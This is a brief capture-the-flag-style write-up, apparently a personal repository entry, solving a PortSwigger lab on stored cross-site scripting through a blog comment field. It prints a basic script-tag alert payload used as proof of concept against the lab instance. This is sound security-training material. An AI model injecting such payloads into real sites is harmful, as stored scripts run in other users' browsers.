# Lab: Stored XSS into HTML context with nothing encoded

# [Lab Link](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded) 


# Vulnerable Parameter
```plaintext
https://0a45001903c61ec6809117c5008700ef.web-security-academy.net/post?postId=7

```
* In this parameter you can find a comment post section where you can put texts and that will  be stored !

```js
<script>alert("Hello world")</script>
```  


![alt image](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/Screenshot%202024-05-22%20164532.png?raw=true)  


